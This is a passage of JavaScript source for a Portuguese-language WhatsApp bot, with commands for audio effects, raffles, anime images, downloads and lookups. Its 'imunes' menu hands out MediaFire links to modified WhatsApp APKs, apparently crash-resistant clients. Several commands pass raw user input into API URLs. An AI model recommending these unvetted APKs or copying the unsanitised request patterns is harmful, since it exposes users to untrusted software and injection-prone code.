fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'estourado':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af "volume=12'" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'estourado2':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af "acrusher=.1:1:64:0:log" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

//=========(FIM-ALTERAR-AUDIO)===========\\

case 'sorteio':
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')
try{
if(!isGroup) return reply(enviar.msg.grupo)
if(!q) return reply(`Coloque algo, após o comando sorteio, por exemplo, ${prefix}sorteio de 100 R$`)
d = []
teks = `[☔] PARABÉNS, VOCÊ É O SORTUDO DO GRUPO\n\n`
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `┠➥ *[☔] USUÁRIO*  @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'sorteionumeros':  
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')  
try{
if(!isGroup) return reply(enviar.msg.grupo)
if(!q) return reply(`Coloque algo, após o comando sorteio, por exemplo, ${prefix}sorteionumero de 100 R$`)
var numerossrt = sortear[Math.floor(Math.random() * sortear.length)] 
d = []
teks =  `[☔] PARABÉNS, VOCÊ É O SORTUDO DO GRUPO\n\n`
for(i = 0; i < 1; i++) {
teks += `┠➥ *[☔] NÚMERO:* ${numerossrt}\n`
d.push(numerossrt)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'gitbot': 
case 'git': {
let buttons = [
{buttonId: `${prefix}termux`, buttonText: {displayText: '[☔] 𝗧𝗘𝗥𝗠𝗨𝗫 119 [☔] '}, type: 1}, 
{buttonId: `${prefix}contratar`, buttonText: {displayText: '[☔] 𝗖𝗢𝗠𝗣𝗥𝗔𝗥 𝗕𝗢𝗧 [☔]'}, type: 1},
{buttonId: `${prefix}menu`, buttonText: {displayText: '[☔] 𝗠𝗘𝗡𝗨 𝗣𝗥𝗜𝗡𝗖𝗜𝗣𝗔𝗟 [☔]'}, type: 1}]
let thumbInfo = `ж☬ˢLᎾᏒᎠᎬ༻꧂ 

[☔] 𝗕𝗢𝗧: Lorde - MD
[☔] 𝗩𝗘𝗥𝗦𝗔̃𝗢: 2.0
[☔] 𝗔𝗥𝗤𝗨𝗜𝗩𝗢: descrip
[☔] 𝗦𝗨𝗣𝗢𝗥𝗧𝗘 : 24h
[☔] 𝗖𝗢𝗠𝗔𝗡𝗗𝗢𝗦: +1000
[☔] 𝗔𝗧𝗨𝗔𝗟𝗜𝗭𝗔𝗖̧𝗔̃𝗢: semanal`;
blabla = fs.readFileSync('./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg')
buttonMessage = {image: blabla, caption: `${thumbInfo}`, footer: `© Copyright by Nezuko-MD`, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage, {quoted: dnselo})
}
break

case 'metadinha': {
nezuko.sendMessage(from, { react: { text: `👋`, key: m.key }})    
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
nezuko.sendMessage(from, { image: { url: random.male }, caption: `MASCULINO` }, { quoted: dnselo })
nezuko.sendMessage(from, { image: { url: random.female }, caption: `FEMININO` }, { quoted: dnselo })
}
break

case 'metadinha2': 
                anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                random = anu[Math.floor(Math.random() * anu.length)]
        var wbutsssss = [
{buttonId: `affscringe`, buttonText: {displayText: `[☔]`}, type: 1},
]
      let buttonssMessssage = {
       image: {url:random.male},
       caption:  `MASCULINO`,
      footer: `${NomeDoBot}`,
      buttons: wbutsssss,
      headerType: 4
      }
await nezuko.sendMessage(from,buttonssMessssage, { quoted: dnselo }).catch(err => {
    return('Error!')
}) 
                 
                           var wbutssss = [
{buttonId: `affscringe`, buttonText: {displayText: `[☔]`}, type: 1},
]
      let buttonssMesssage = {
       image: {url:random.female},
       caption:  `FEMININO`,
      footer: `${NomeDoBot}`,
      buttons: wbutssss,
      headerType: 4
      }
await nezuko.sendMessage(from,buttonssMesssage, { quoted: dnselo }).catch(err => {
    return('Error!')
}) 
	    break

            case 'metadinha3': {
try {
nezuko.sendMessage(from, {react: {text: `✅`, key: info.key}})
let anu = await fetchJson(`https://nezsab-apis.xyz/api/random/metadinha?apikey=${keyapi}`)
nezuko.sendMessage(from, { image: { url: anu.resultado.metadinha_feminina }, caption: `Perfil Feminino:` }, { quoted: dnselo })
nezuko.sendMessage(from, { image: { url: anu.resultado.metadinha_masculina }, caption: `Perfil Masculino:` }, { quoted: dnselo })
} catch { reply('ERROR!') }
}
break

case 'metadinha4': {
try {
nezuko.sendMessage(from, {react: {text: `✅`, key: info.key}})
let anu = await fetchJson(`https://nezsab-apis.xyz/api/random/metadinha2?apikey=${keyapi}`)
nezuko.sendMessage(from, { image: { url: anu.resultado.parte_feminina }, caption: `Perfil Feminino:` }, { quoted: dnselo })
nezuko.sendMessage(from, { image: { url: anu.resultado.parte_masculina }, caption: `Perfil Masculino:` }, { quoted: dnselo })
} catch { reply('ERROR!') }
}
break

case 'imunes': 
case 'menuimunes':
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
adivinhaa = info.key.id.length > 21 ? 'Android 🥴' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE 🔋🔌' : 'ZAP DA WEB 💻';
sections = [
{
title:`[☔] Lorde Bot MD [☔]`,
rows: [
{title: `[☔] 50K BLACK ROXO [☔]`, rowId:`${prefix}imune1`, description: "Imune primário"},
{title: `[☔] 50K BLACK SECUNDÁRIO ROXO [☔]`, rowId:`${prefix}imune2`, description: "Imune secundário"},
{title: `[☔] BASE BY BISHOP [☔]`, rowId:`${prefix}imune3`, description: "Base primária"},
{title: `[☔] BASE PRIMÁRIA [☔]`, rowId:`${prefix}imune4`, description: "Base primária"},
{title: `[☔] BILLS HAKAI [☔]`, rowId:`${prefix}imune5`, description: "Imune primário"},
{title: `[☔] BILLS HAKAI SECUNDÁRIO [☔]`, rowId:`${prefix}imune6`, description: "Imune secundário"},
{title: `[☔] DANCING IN HELL [☔]`, rowId:`${prefix}imune7`, description: "Imune primário"},
{title: `[☔] FREEDOM WINGS AMARELO [☔]`, rowId:`${prefix}imune8`, description: "Imune primário"},
{title: `[☔] VIBES DARK PRETO [☔]`, rowId:`${prefix}imune9`, description: "Imune primário"},
{title: `[☔] TISU END 3 [☔]`, rowId:`${prefix}imune10`, description: "Imune primário"},
{title: `[☔] EL THE FURY ROXO [☔]`, rowId:`${prefix}imune11`, description: "Imune primário"},
{title: `[☔] BISHOP O LOKO [☔]`, rowId:`${prefix}imune12`, description: "Imune primário"},
{title: `[☔] BISHOP O LOKO VERMELHO [☔]`, rowId:`${prefix}imune13`, description: "Imune secundário"},
]
},
]
 

const listMessage2 = {
text: `
${pushname} bem vindo ao menu de imunes.`,
  footer: `➥@daniell_dn1`,
  title: ``,
  buttonText:`[☔] MENU IMUNES [☔]`,
  sections
}
sendMsg = await nezuko.sendMessage(from, listMessage2, {quoted: dnselo})
break

case 'imune1':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/3munyxvb8dmjt09/50K_BLACK_%2528ROXO%2529.apk/file
`)
break

case 'imune2':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/jjdx696vpyr1xa7/50K_BLACK_%2528SECUNDARIO_ROXO%2529.apk/file
`)
break

case 'imune3':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/l7aa2een9x345z8/Base_By_Bishop_%2528sem_obsoleto_2.22.20.3%2529.apk/file
`)
break

case 'imune4':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/wkba5qauviedvuf/Base_Prim%25C3%25A1ria_%2528Colocar_o_n%25C3%25BAmero%252C_pedir_c%25C3%25B3digo%252C_corrigir_crash%2529_%25281%2529%25282%2529.apk/file
`)
break

case 'imune5':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/7dmiwdzndxoons6/Bills_Hakai_Primario1.apk/file
`)
break

case 'imune6':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/gmtnaeq8f47h2le/Bills_Hakai_Secund%25C3%25A1rio2.apk/file
`)
break

case 'imune7':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/313lk2o71rykphg/dancing_in_hell_sem_obsoleto.zip/file
`)
break

case 'imune8':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/6z1b0ec2nqh0zy5/%25F0%259D%2590%2585%25F0%259D%2590%25AB%25F0%259D%2590%259E%25F0%259D%2590%259E%25F0%259D%2590%259D%25F0%259D%2590%25A8%25F0%259D%2590%25A6_%25F0%259D%2590%2596%25F0%259D%2590%25A2%25F0%259D%2590%25A7%25F0%259D%2590%25A0%25F0%259D%2590%25AC_%25E2%2580%2590%25E2%25BB%25B0_%2528Amarelo%2529_%2528com.PxsMini%2529.apk/file
`)
break

case 'imune9':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/w6fcsfkxbbeggcy/%25F0%259D%2590%2595%25F0%259D%2596%258E%25F0%259D%2596%2587%25F0%259D%2596%258A%25F0%259D%2596%2598_%25EA%2594%25B8_%25F0%259D%2595%25AF%25F0%259D%2596%2586%25F0%259D%2596%2597%25F0%259D%2596%2590_%25F0%259D%2590%2586%25F0%259D%2596%2594_%25C3%2597_Preto_-_Branco.apk/file
`)
break

case 'imune10':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/yc3ziax1z63pboe/%25F0%259D%2591%2587%25F0%259D%2591%2596%25F0%259D%2591%25A0%25F0%259D%2591%25A2_%25F0%259D%2590%25B8%25F0%259D%2591%259B%25F0%259D%2591%2591_%25F0%259D%2590%25BC%25F0%259D%2590%25BC%25F0%259D%2590%25BC.apk/file
`)
break

case 'imune11':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/d5nwazg6kn3fhuu/%25F0%259D%259A%25B5%25F0%259D%2590%258B_%25F0%259D%2590%2593%25F0%259D%2590%2587%25F0%259D%259A%25B5_%25F0%259D%2590%2585%25F0%259D%2590%2594%25F0%259D%2590%2591%25F0%259D%2590%2598_%2528Roxo%2529.apk/file
`)
break

case 'imune12':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/6ec43ft1rnxsltf/%25EA%259C%259B_%25C2%25B2%25F0%259D%2590%2581%25F0%259D%2590%2588%25F0%259D%2590%2592%25F0%259D%2590%2587%25F0%259D%2590%258E%25F0%259D%2590%258F_%25F0%2596%25A6%25BC_%25F0%259D%2590%258E_%25F0%259D%2590%258B%25F0%259D%2590%258E%25F0%259D%2590%258A%25F0%259D%2590%258E_%25EA%259C%259C_%255BSEC%255D_%255BROXO%255D_rr.apk.apk/file
`)
break

case 'imune13':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/2mfxwxxus5pq7p7/%25EA%259C%259B_%25C2%25B2%25F0%259D%2590%2581%25F0%259D%2590%2588%25F0%259D%2590%2592%25F0%259D%2590%2587%25F0%259D%2590%258E%25F0%259D%2590%258F_%25F0%2596%25A6%25BC_%25F0%259D%2590%258E_%25F0%259D%2590%258B%25F0%259D%2590%258E%25F0%259D%2590%258A%25F0%259D%2590%258E_%25EA%259C%259C_%255BSEC%255D_%255BVERMELHO%255D_rr.apk/file
`)
break

case 'menu-anime': case 'menuanime': {
sections = [
{title: "🇱 🇮 🇸 🇹 🇦   🇩 🇪   🇦 🇳 🇮 🇲 🇪 🇸 ",
rows: [
{title: "✰ۜۜ͜͡𝐒𝐇𝐎𝐓𝐀🎎", rowId: `${prefix}shota`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐈𝐅𝐔🎎", rowId: `${prefix}waifu`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐋𝐎𝐋𝐈🎎", rowId: `${prefix}loli2`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐎𝐓𝐒𝐔𝐁𝐀🎎", rowId: `${prefix}yotsuba`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐇𝐈𝐍𝐎𝐌𝐈𝐘𝐀🎎", rowId: `${prefix}shinomiya`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐔𝐌𝐄𝐊𝐎🎎", rowId: `${prefix}yumeko`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐄𝐉𝐈𝐍𝐀🎎", rowId: `${prefix}tejina`, description: `${NomeDoBot}`}, 
{title: "✰ۜۜ͜͡𝐂𝐇𝐈𝐍𝐎🎎", rowId: `${prefix}chino`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐁𝐎𝐑𝐔𝐓𝐎🎎", rowId: `${prefix}boruto`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐀𝐎𝐑𝐈🎎", rowId: `${prefix}kaori`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐇𝐈𝐙𝐔𝐊𝐀🎎", rowId: `${prefix}shizuka`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐀𝐆𝐀🎎", rowId: `${prefix}kaga`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐎𝐓𝐎𝐑𝐈🎎", rowId: `${prefix}kotori`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐈𝐊𝐀𝐒𝐀🎎", rowId: `${prefix}mikasa`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐊𝐈𝐘𝐀𝐌𝐀🎎", rowId: `${prefix}akiyama`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐑𝐄𝐌𝐎𝐑𝐘🎎", rowId: `${prefix}gremory`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐒𝐔𝐙𝐔🎎", rowId: `${prefix}isuzu`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐇𝐈𝐍𝐀🎎", rowId: `${prefix}shina`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐀𝐆𝐔𝐑𝐀🎎", rowId: `${prefix}kagura`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐇𝐈𝐍𝐊𝐀🎎", rowId: `${prefix}shinka`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐁𝐀🎎", rowId: `${prefix}eba`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐋𝐀𝐈𝐍𝐀🎎", rowId: `${prefix}elaina`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐑𝐙𝐀🎎", rowId: `${prefix}erza`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐇𝐈𝐍𝐀𝐓𝐀🎎", rowId: `${prefix}hinata`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐈𝐍𝐀𝐓𝐎🎎", rowId: `${prefix}minato`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐀𝐑𝐔𝐓𝐎🎎", rowId: `${prefix}naruto`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐀𝐆𝐈𝐑𝐈🎎", rowId: `${prefix}sagiri`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐄𝐙𝐔𝐊𝐎🎎", rowId: `${prefix}nezuko`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐑𝐈𝐙𝐄🎎", rowId: `${prefix}rize`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐃𝐄𝐈𝐃𝐀𝐑𝐀🎎", rowId: `${prefix}deidara`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐔𝐊𝐈🎎", rowId: `${prefix}yuki`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐍𝐀🎎", rowId: `${prefix}ana`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐒𝐔𝐍𝐀🎎", rowId: `${prefix}asuna`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐘𝐔𝐙𝐀𝐖𝐀🎎", rowId: `${prefix}ayuzawa`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐇𝐈𝐓𝐎𝐆𝐄🎎", rowId: `${prefix}chitoge`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐌𝐈𝐋𝐈𝐀🎎", rowId: `${prefix}emilia`, description: `${NomeDoBot}`}, 
{title: "✰ۜۜ͜͡𝐇𝐄𝐒𝐓𝐈𝐀🎎", rowId: `${prefix}hestia`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐍𝐎𝐑𝐈🎎", rowId: `${prefix}inori`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐓𝐀𝐂𝐇𝐈🎎", rowId: `${prefix}itachi`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐀𝐃𝐀𝐑𝐀🎎", rowId: `${prefix}madara`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐀𝐊𝐔𝐑𝐀🎎", rowId: `${prefix}sakura`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐀𝐒𝐔𝐊𝐄🎎", rowId: `${prefix}sasuke`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐒𝐔𝐍𝐀𝐃𝐄🎎", rowId: `${prefix}tsunade`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎𝐍𝐄-𝐏𝐈𝐄𝐂𝐄🎎", rowId: `${prefix}onepiece`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐎𝐁𝐈𝐋🎎", rowId: `${prefix}emilia`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐎𝐍𝐓𝐎𝐑🎎", rowId: `${prefix}montor`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐄𝐍𝐄𝐊𝐈🎎", rowId: `${prefix}keneki`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐄𝐆𝐔𝐌𝐈𝐍🎎", rowId: `${prefix}megumin`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐎𝐔𝐊𝐀𝐂𝐇𝐀𝐍🎎", rowId: `${prefix}toukachan`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐓𝐎𝐑𝐈🎎", rowId: `${prefix}itori`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐀𝐊𝐔𝐑𝐀𝐉𝐈𝐌𝐀🎎", rowId: `${prefix}sakurajima`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐔𝐑𝐔𝐌𝐈🎎", rowId: `${prefix}kurumi`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐈𝐊𝐔🎎", rowId: `${prefix}miku`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐎𝐊𝐄𝐌𝐎𝐍🎎", rowId: `${prefix}pokemon`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐎𝐒𝐏𝐋𝐀𝐘🎎", rowId: `${prefix}cosplay`, description: `${NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `Bem vindo(a), *${pushname}*,\nSelecione quantos você desejar.`,
  footer: `By: ${NomeDoBot}`,
  title: `˚⸺͟͞ꪶ𝐌𝐄𝐍𝐔-𝐀𝐍𝐈𝐌𝐄𝐒ꫂ ✰✰✰`,
  buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: dnselo})
}
break

case 'shota': //hya
case 'waifu': //hya
case 'loli2': //hya
case 'yotsuba': //hya
case 'shinomiya': //hya
case 'yumeko': //hya
case 'tejina': //hya
case 'chiho': //hya
case 'boruto': //hya
case 'kaori': //hya
case 'shizuka': //hya
case 'kaga': //hya
case 'kotori': //hya
case 'mikasa': //hya
case 'akiyama': //hya
case 'gremory': //hya
case 'isuzu': //hya
case 'shina': //hya
case 'kagura': //hya
case 'shinka': //hya
case 'eba': //hya
case 'elaina': //hya
case 'erza': //hya
case 'hinata': //hya
case 'minato': //hya
case 'naruto': //hya
case 'sagiri': //hya
case 'nezuko': //hya
case 'rize': //hya
case 'deidara': //hya
case 'yuki': //hya
case 'ana': //hya
case 'asuna': //hya
case 'ayuzawa': //hya
case 'chitoge': //hya
case 'emilia': //hya
case 'hestia': //hya
case 'inori': //hya
case 'itachi': //hya
case 'madara': //hya
case 'sakura': //hya
case 'sasuke': //hya
case 'tsunade': //hya
case 'onepiece': //hya
case 'mobil': //hya
case 'montor': //hya
case 'keneki': //hya
case 'megumin': //hya
case 'toukachan': //hya
case 'itori': //hya
case 'kurumi': //hya
case 'sakurajima': //hya
case 'miku': //hya
case 'pokemon': //hya
reply(`*Ei ${pushname}*, já estou enviando sua imagem... Enquanto isso tome um café!`)
buttonss = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎𝐗𝐈𝐌𝐀-𝐈𝐌𝐀𝐆𝐄𝐌🎎'}, type: 1}]
buttonMessagse = {
image: {url: `https://www.nezsab-apis.xyz/random/${command}?apikey=${keyapi}`},
caption: `▢ ⌁ *Olá ${pushname}*, aqui está o seu pedido!\n▢ ⌁ *Horário solicitado:* ${time}\n▢ ⌁ Deseja mais *fotos do(a) ${command}?* Clique no botão abaixo!`,
footer: `By: ${NomeDoBot}`,
buttons: buttonss,
headerType: 4
}
nezuko.sendMessage(from, buttonMessagse, {quoted: dnselo})
break

case 'wikipedia': 
reply(`*Ei ${pushname}*, estou realizando a pesquisa sobre: *${q}*`)
sendee = await fetchJson(`http://nezsab-api2.herokuapp.com/api/wikipedia?q=${q}&apikey=${keyapi}`)
txt = `✓ 🏷 𝘛𝘪𝘵𝘶𝘭𝘰⧽ ${sendee.pesquisa.titulo}\n`
txt += `× 🈹 𝘋𝘦𝘴𝘤𝘳𝘪𝘤̧𝘢̃𝘰⧽ ${sendee.pesquisa.descrição}\n`
txt += `× ✒️ 𝘙𝘦𝘴𝘶𝘭𝘵𝘢𝘥𝘰⧽ ${sendee.pesquisa.resultado}`
img = await getBuffer(sendee.pesquisa.thumb)
nezuko.sendMessage(from, {image: img, caption: `${txt}`}, {quoted: dnselo})
break

case 'qrcode':
reply(mess.wait)
const tex = encodeURIComponent(body.slice(8))
if (!tex) return reply('Digite um texto/url que deseja criar um código qr')
const bufferr = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${tex}`)
nezuko.sendMessage(m.chat, {image: bufferr}, {quoted: dnselo})
break

case 'soundcloud':
{
soundb = args.join(' ')
  if (!soundb) return reply('Cadê o link do SoundCloud?')
let buttons = [
{buttonId: `${prefix}sc_audio ${q}`, buttonText: {displayText: '🎶 Baixar [ Formato: Áudio ]'}, type: 1}, 
{buttonId: `${prefix}sc_documento ${q}`, buttonText: {displayText: '📄 Baixar [ Formato: Doc ]'}, type: 1}]
vt = await axios.get(`https://nezsab-apis.xyz/api/soundcloud?url=${soundb}&apikey=${keyapi}`)
let thumbInfo = `    ₊˚.ೃೀ𝐒𝐎𝐔𝐍𝐃✰𝐂𝐋𝐎𝐔𝐃፝֯֟⋆⁺˖⸙̭❛◌*̥₊\n   lıl.ılı.lıllılı.ıllı..ılı.lıllılı.ıllı.ılı.lılı.lıllılıl.lıl\n➤ۜۜ͜͡🎶 𝘔𝘶́𝘴𝘪𝘤𝘢⧽ ${vt.data.resultado.titulo}\n➤ۜۜ͜͡🏷️ 𝘛𝘰𝘵𝘢𝘭 𝘥𝘦 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥𝘴⧽ ${vt.data.resultado.total_downloads}`;
img = await getBuffer(vt.data.resultado.capa);
buttonMessage = {image: img, caption: `${thumbInfo}`, footer: `Usuário: ${pushname}\nBy: ${NomeDoBot}`, buttons: buttons, headerType: 4}
nezuko.sendMessage(from, buttonMessage, {quoted: dnselo})
}
break

case 'sc_documento':
// @Victor Gabriel
reply('Aguarde, estou baixando sua música!')
vt = await axios.get(`https://nezsab-apis.xyz/api/soundcloud?url=${soundb}&apikey=${keyapi}`)
nezuko.sendMessage(from, { document: { url: vt.resultado.link_dl }, mimetype: 'audio/mpeg', fileName: `${vt.resultado.titulo}.mp3` }, { quoted: dnselo })
break

case 'sc_audio':
// @Victor Gabriel
reply('Aguarde, estou baixando sua música!')
vt = await fetchJson(`https://nezsab-apis.xyz/api/soundcloud?url=${soundb}&apikey=${keyapi}`)
nezuko.sendMessage(from, { audio: { url: vt.resultado.link_dl }, mimetype: 'audio/mpeg', fileName: `${vt.resultado.titulo}.mp3` }, { quoted: dnselo })
break

case 'soundcloud2': 
qd = args.join(" ")
nezuko.sendMessage(from, { react: { text: `🔍`, key: m.key }})
if(qd.length < 7) return reply('Você deve pegar o link gerado do Soundcloud e usar com esse comando, e ele enviará seu áudio.')
anu = await fetchJson(`https://ayu.p7api.xyz/api/dl/sound?link=${q}&apikey=${keyapi2}`)
pla = `🎶 *Música:* ${anu.resultado.titulo}\n`
pla += `🏷️ *Total de downloads:* ${anu.resultado.total_downloads}\n`
pla += `*_Aguarde, estou enviando o áudio!_*`
img = await getBuffer(anu.resultado.capa)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})
nezuko.sendMessage(from, { audio: { url: anu.resultado.link_dl }, mimetype: 'audio/mpeg', fileName: `${anu.resultado.titulo}.mp3` }, { quoted: dnselo})
break

case 'happymod':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`http://nezsab-api2.herokuapp.com/api/happymod?q=${q}&apikey=${keyapi}`)
.then(e => {
try{
d = e.data.resultado;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 🏷️ 𝘕𝘰𝘮𝘦⧽ ${i.nome}\n× 🔗 𝘓𝘪𝘯𝘬⧽ ${i.link}\n\n`;
}
nezuko.sendMessage(from, {image:{url: `${logo}`}, caption:txt})
}catch(err){
reply(`Nenhum resultado foi encontrado.`)
}
}).catch(err => {
reply('Ops, eu acho que a api ou módulo caiu!')
console.log(err);
});
break

case 'playvid2': 
// @Sabrina-MD by Bielziinn
qp = args.join(" ")
res = await yts(qp)
nezuko.sendMessage(from, {react: {text: `⏳`, key: info.key}})
blaimg = await getBuffer(res.all[0].image)
bla = `▢ *Título:* ${res.all[0].title}\n▢ *Visualizações:* ${res.all[0].views}\n▢ *Duração:* ${res.all[0].timestamp}\n▢ *Canal:* ${res.all[0].author.name}`
sendBimg(from, `${res.all[0].image}`, bla, "", [
